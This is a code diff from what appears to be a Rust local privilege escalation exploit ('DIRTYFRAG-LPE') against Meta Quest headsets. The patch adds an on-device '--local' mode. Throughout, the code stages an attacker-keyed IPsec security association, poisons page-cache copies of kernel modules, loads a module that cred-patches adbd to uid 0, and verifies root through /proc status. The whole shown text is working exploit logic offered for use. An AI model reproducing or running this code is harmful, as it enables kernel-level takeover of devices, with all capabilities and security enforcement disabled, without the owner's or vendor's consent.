@@ -152,14 +152,14 @@ fn push_bytes(adb: &Adb, workdir: &Path, name: &str, bytes: &[u8], remote: &str)
 }
 
 // ============================== two-carrier flow (Quest 3 / 3S 5.10 non-merged) ==============================
-pub fn run(t: &Target, device_override: Option<&str>, cleanup: Cleanup, verify_root: bool, settle_ms: u64, skip_magisk: bool) {
-    if t.merged() { return run_merged(t, device_override, cleanup, verify_root, settle_ms, skip_magisk); }
-    let workdir = make_workdir();
-    banner(&format!("DIRTYFRAG-LPE   target: {}", t.s(&["name"])));
+pub fn run(t: &Target, device_override: Option<&str>, cleanup: Cleanup, verify_root: bool, settle_ms: u64, skip_magisk: bool, local: bool) {
+    if t.merged() { return run_merged(t, device_override, cleanup, verify_root, settle_ms, skip_magisk, local); }
+    let workdir = make_workdir(local);
+    banner(&format!("DIRTYFRAG-LPE   target: {}{}", t.s(&["name"]), if local { "  (on-device / --local)" } else { "" }));
     info(&t.s(&["description"]));
 
-    let serial = pick_device(&t.s(&["device", "build_incremental"]), device_override);
-    let adb = Adb::new(&serial);
+    let (serial, adb) = if local { ("local".to_string(), Adb::new_local()) }
+                        else { let s = pick_device(&t.s(&["device", "build_incremental"]), device_override); (s.clone(), Adb::new(&s)) };
     step("Preflight");
     let dev_build = adb.getprop("ro.build.version.incremental");
     let msg = format!("device {}  build {}", serial, dev_build);
@@ -188,7 +188,7 @@ pub fn run(t: &Target, device_override: Option<&str>, cleanup: Cleanup, verify_r
     ok(&format!("cfg patched  ({} diff bytes)", cfg_want.iter().zip(&cfg_cur).filter(|(a, b)| a != b).count()));
 
     banner("STAGE  (shell: Dirty-Frag SA)");
-    let mut stager = Stager::new(&serial);
+    let mut stager = Stager::new(&serial, local);
     step(&format!("Staging attacker-keyed AES-GCM ESP SA ({})", t.s(&["dirtyfrag", "sa_spi"])));
     let port = stager.start().unwrap_or_else(|| die("stager failed (stale SA? reboot to clear xfrm)"));
     ok(&format!("SA live, encap port {}  (held by background stager)", port));
@@ -293,7 +293,7 @@ fn run_postex_twocarrier(t: &Target, adb: &Adb, workdir: &Path, ik: &str, eva_st
     step("Launching waiting shell (to be cred-patched to uid 0)");
     let mut cmods = Vec::new();
     for c in ["cred_carrier", "carrier"] { if t.has(&[c]) { let m = mod_name(&t.s(&[c, "device_path"])); if !cmods.contains(&m) { cmods.push(m); } } }
-    let mut wsh = WaitShell::new(&adb.serial, skip_magisk, &cmods.join(" "));
+    let mut wsh = WaitShell::new(&adb.serial, adb.local, skip_magisk, &cmods.join(" "));
     let pid = wsh.start().unwrap_or_else(|| die("waiting shell failed"));
     ok(&format!("waiting shell pid {}", pid));
     step("Diff-patching cred carrier (usbip-vudc: enforcing=0 + cred-patch, anchor-relative)");
@@ -335,9 +335,17 @@ fn run_adbroot_twocarrier(t: &Target, adb: &Adb, workdir: &Path, port: u16, spi:
     dfpoison_job(adb, workdir, port, spi, keymat, &[(t.s(&["cfg", "device_path"]), cfg_spec, "cfg_pe".into())]);
     step("ctl.start insmod_sh -> loads uv.ko -> cred-patch adbd");
     adb.sh(&format!("setprop ctl.start {}", t.s(&["services", "insmod_sh"])));
+    // Verify by reading adbd's OWN creds (/proc/<pid>/status), not `id -u`: the cred-patch changes
+    // adbd's task creds, so only shells adbd forks AFTER the patch are root. In --local mode our own
+    // `id -u` stays uid 2000, so id -u would false-negative even on success; the /proc check is correct
+    // in both modes (and matches how NEW adb shells inherit the patched creds).
     let mut rooted = false;
-    for _ in 0..120 { ms(100); if adb.sh("id -u") == "0" { rooted = true; break; } }
-    if !rooted { die("adb shell not root (uv.ko load failed?)"); }
+    for _ in 0..120 {
+        ms(100);
+        let uline = adb.sh(&format!("grep -m1 Uid /proc/{}/status 2>/dev/null", pid));
+        if uline.split_whitespace().nth(1) == Some("0") { rooted = true; break; }
+    }
+    if !rooted { die("adbd not cred-patched (uv.ko load failed?)"); }
     win(&format!("adbd (pid {}) cred-patched -> NEW adb shells are uid 0 + all caps + kernel context", pid));
     info("Open a NEW adb shell to get full root:   adb shell   ->   id  (uid=0)");
     warn("residue (needs reboot): carrier/cfg page-cache poison + loaded modules (exit neutralized, rmmod-safe)");
@@ -369,12 +377,12 @@ fn stage_postex_assets(adb: &Adb, workdir: &Path) {
 }
 
 // ============================== merged flow (Quest Pro 4.19 / Q2 / Q3S .text-splice) ==============================
-pub fn run_merged(t: &Target, device_override: Option<&str>, cleanup: Cleanup, _verify_root: bool, settle_ms: u64, skip_magisk: bool) {
-    let workdir = make_workdir();
-    banner(&format!("DIRTYFRAG-LPE (merged)   target: {}", t.s(&["name"])));
+pub fn run_merged(t: &Target, device_override: Option<&str>, cleanup: Cleanup, _verify_root: bool, settle_ms: u64, skip_magisk: bool, local: bool) {
+    let workdir = make_workdir(local);
+    banner(&format!("DIRTYFRAG-LPE (merged)   target: {}{}", t.s(&["name"]), if local { "  (on-device / --local)" } else { "" }));
     info(&t.s(&["description"]));
-    let serial = pick_device(&t.s(&["device", "build_incremental"]), device_override);
-    let adb = Adb::new(&serial);
+    let (serial, adb) = if local { ("local".to_string(), Adb::new_local()) }
+                        else { let s = pick_device(&t.s(&["device", "build_incremental"]), device_override); (s.clone(), Adb::new(&s)) };
     step("Preflight");
     let dev_build = adb.getprop("ro.build.version.incremental");
     let m = format!("device {}  build {}", serial, dev_build);
@@ -388,7 +396,7 @@ pub fn run_merged(t: &Target, device_override: Option<&str>, cleanup: Cleanup, _
     disable_phantom(&adb);
 
     banner("STAGE  (shell: Dirty-Frag SA)");
-    let mut stager = Stager::new(&serial);
+    let mut stager = Stager::new(&serial, local);
     step(&format!("Staging attacker-keyed AES-GCM ESP SA ({})", t.s(&["dirtyfrag", "sa_spi"])));
     let port = stager.start().unwrap_or_else(|| { die("stager failed (stale SA? reboot to clear xfrm)") });
     ok(&format!("SA live, encap port {}", port));
@@ -409,7 +417,7 @@ pub fn run_merged(t: &Target, device_override: Option<&str>, cleanup: Cleanup, _
     } else {
         step("Launching waiting shell (pid baked into carrier, cred-patched to uid 0 at module load)");
         let cmod = mod_name(&t.s(&["carrier", "device_path"]));
-        let mut w = WaitShell::new(&serial, skip_magisk, &cmod);
+        let mut w = WaitShell::new(&serial, local, skip_magisk, &cmod);
         let p = w.start().unwrap_or_else(|| { stager.stop(); die("waiting shell failed") });
         ok(&format!("waiting shell pid {}", p));
         pid = p;
@@ -557,8 +565,9 @@ pub fn run_merged(t: &Target, device_override: Option<&str>, cleanup: Cleanup, _
     }
 }
 
-fn make_workdir() -> PathBuf {
-    let mut d = std::env::temp_dir();
+fn make_workdir(local: bool) -> PathBuf {
+    // on-device (--local) the host temp_dir (/tmp) may be unwritable; stage under /data/local/tmp.
+    let mut d = if local { PathBuf::from("/data/local/tmp") } else { std::env::temp_dir() };
     let pid = std::process::id();
     let nanos = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).map(|x| x.subsec_nanos()).unwrap_or(0);
     d.push(format!("fuguquest_{}_{}", pid, nanos));
